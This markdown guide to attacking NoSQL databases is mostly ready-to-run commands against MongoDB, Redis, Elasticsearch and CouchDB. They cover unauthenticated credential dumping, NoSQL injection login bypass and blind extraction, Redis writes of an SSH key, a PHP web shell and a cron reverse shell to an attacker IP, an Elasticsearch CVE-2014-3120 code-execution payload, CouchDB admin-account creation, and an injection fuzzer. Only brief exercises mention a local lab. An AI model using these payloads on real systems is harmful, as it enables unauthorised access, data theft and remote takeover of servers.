# NoSQL Database Attack Guide

## Introduction

NoSQL databases (MongoDB, Redis, CouchDB, Elasticsearch) are widely deployed in modern web applications, often with weaker security defaults than traditional relational databases. Their flexible schema design and HTTP-based APIs create unique attack surfaces including NoSQL injection, unauthorized access through default configurations, and data exfiltration through query manipulation. This guide covers practical attack techniques against each major NoSQL database platform, from reconnaissance to data extraction.

## Practical Steps

### 1. MongoDB Unauthorized Access and Enumeration

```bash
# Check for unauthenticated MongoDB (default port 27017)
nmap -p 27017 --script mongodb-info target_ip

# Connect without authentication
mongo --host target_ip --port 27017

# If connected, enumerate databases and collections
show dbs
use admin
show collections
db.users.find().limit(10)

# Check for sensitive data patterns
db.users.find({}, {password: 1, email: 1, _id: 0}).limit(20)

# Extract user credentials
db.admin.users.find()
db.getUsers()
```

### 2. MongoDB NoSQL Injection

```bash
# NoSQL injection in login bypass
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# Extract data with $where operator
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"search": "{\"$where\": \"this.password.match(/.*/)\"}"}'

# Boolean-based NoSQL injection
curl -X POST http://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"user_id": {"$gt": ""}, "password": {"$regex": "^a"}}'

# Time-based blind NoSQL injection
curl -X POST http://target.com/api/query \
  -H "Content-Type: application/json" \
  -d '{"$where": "if(this.password[0]=='a'){sleep(5000);return true;}else{return false;}"}'
```

### 3. Redis Exploitation

```bash
# Check for unauthenticated Redis (default port 6379)
redis-cli -h target_ip ping

# If PONG returned, enumerate data
redis-cli -h target_ip info
redis-cli -h target_ip config get dir
redis-cli -h target_ip keys '*'

# Extract all keys and values
redis-cli -h target_ip --scan

# Write SSH authorized_keys via Redis
redis-cli -h target_ip config set dir /var/lib/redis/
redis-cli -h target_ip config set dbfilename authorized_keys
redis-cli -h target_ip set ssh_key "ssh-rsa AAAA... attacker@kali"
redis-cli -h target_ip save

# Write web shell via Redis
redis-cli -h target_ip config set dir /var/www/html/
redis-cli -h target_ip config set dbfilename shell.php
redis-cli -h target_ip set payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h target_ip save

# Cron-based reverse shell via Redis
redis-cli -h target_ip config set dir /var/spool/cron/
redis-cli -h target_ip config set dbfilename root
redis-cli -h target_ip set cronline '* * * * * /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
redis-cli -h target_ip save
```

### 4. Elasticsearch Attacks

```bash
# Enumerate Elasticsearch indices (default port 9200)
curl -s http://target_ip:9200/_cat/indices?v

# Dump all data from an index
curl -s http://target_ip:9200/_search?size=10000 | python3 -m json.tool

# Search for sensitive data
curl -s "http://target_ip:9200/_search?q=password:*&size=50" | python3 -m json.tool

# Check cluster health and nodes
curl -s http://target_ip:9200/_cluster/health?pretty
curl -s http://target_ip:9200/_nodes?pretty

# Exploit CVE-2014-3120 (old versions) - remote code execution
curl -X POST http://target_ip:9200/_search?pretty -d '
{
  "size": 1,
  "query": {
    "filtered": {
      "query": { "match_all": {} }
    }
  },
  "script_fields": {
    "command": {
      "script": "import java.util.*;import java.io.*;String str = \"id\";Process p = Runtime.getRuntime().exec(str);BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));StringBuilder sb = new StringBuilder();String line;while((line=br.readLine())!=null){sb.append(line);}return sb.toString();"
    }
  }
}'
```

### 5. CouchDB Attacks

```bash
# Enumerate CouchDB databases (default port 5984)
curl -s http://target_ip:5984/_all_dbs

# Get server info
curl -s http://target_ip:5984/ | python3 -m json.tool

# Dump database contents
curl -s http://target_ip:5984/target_db/_all_docs?include_docs=true

# Check for admin party mode (no authentication)
curl -s http://target_ip:5984/_session

# Create admin user if in admin party mode
curl -X PUT http://target_ip:5984/_node/nonode@nohost/_config/admins/attacker -d '"password123"'

# Exploit CVE-2017-12635 (CouchDB RCE)
curl -X PUT http://target_ip:5984/_users/org.couchdb.user:attacker \
  -H "Content-Type: application/json" \
  -d '{"type": "user", "name": "attacker", "roles": ["_admin"], "password": "password123"}'
```

### 6. NoSQL Injection Automation

```python
# Automated NoSQL injection testing
import requests
import json

def test_nosql_injection(url, param_name):
    payloads = [
        {"$ne": ""},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$where": "return true"},
        {"$exists": True},
    ]
    results = []
    for payload in payloads:
        data = {param_name: payload}
        try:
            r = requests.post(url, json=data, timeout=10)
            results.append({
                "payload": str(payload),
                "status": r.status_code,
                "length": len(r.text),
                "anomaly": r.status_code == 200 and len(r.text) > 100,
            })
        except Exception as e:
            results.append({"payload": str(payload), "error": str(e)})
    return results

results = test_nosql_injection("http://target.com/api/login", "username")
for r in results:
    if r.get("anomaly"):
        print(f"[!] Possible injection: {r['payload']} -> status={r['status']} len={r['length']}")
```

## Hands-on Exercises

### Exercise 1: MongoDB Reconnaissance and Data Extraction

Set up a vulnerable MongoDB instance (docker run -p 27017:27017 mongo). Practice connecting without credentials, enumerating databases, extracting user data, and identifying sensitive information. Document each step with evidence.

### Exercise 2: Redis to RCE Chain

Given a Redis instance exposed without authentication, achieve remote code execution through at least two different methods (SSH key injection, web shell, or cron job). Document the attack chain and remediation steps.

## References

- MongoDB Security Checklist — https://www.mongodb.com/docs/manual/administration/security-checklist/
- Redis Security Documentation — https://redis.io/docs/management/security/
- OWASP NoSQL Injection — https://owasp.org/www-community/Injection_Flaws
- Elasticsearch Security — https://www.elastic.co/guide/en/elasticsearch/reference/current/security-settings.html
